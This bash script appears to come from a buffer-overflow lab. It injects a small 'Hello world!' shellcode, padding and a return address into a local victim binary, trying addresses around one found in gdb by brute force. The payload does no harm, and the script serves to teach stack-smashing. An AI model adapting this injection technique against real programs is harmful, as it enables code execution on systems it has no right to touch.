# This repeatedly calls the victim-binary with different address of the buffer
# as a hit-and-trial method to locate the buffer
# The buffer address was noted to be 0x7fffffffdec0 in gdb, hence trying around it..
hellocode='\x90\x90\x90\x90\x6a\x01\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\xeb\x12\x5e\x48\x31\xd2\xb2\x0d\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xe9\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x21\x20'
padding='\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
rm result.txt
for ((i=-1000; i<=1000; i++))
do
    base=0x7fffffffdec0
    #      0123456789ab (indices for above)
    base=$(($base+$i)) # adds the loop variable
    base=$(printf "%x" $base) # converts int to hex
    echo -e -n $hellocode > attack.txt
    echo -e -n $padding >> attack.txt
    address="\x${base:10:2}\x${base:8:2}\x${base:6:2}\x${base:4:2}\x${base:2:2}\x${base:0:2}"
    # echo $address
    echo -e $address >> attack.txt
    # echo \\x${base:10:2}\\x${base:8:2}\\x${base:6:2}\\x${base:4:2}\\x${base:2:2}\\x${base:0:2} >> attack.txt #prints the address in little-endian
    ./victimbinary_24205 < attack.txt &> result.txt
done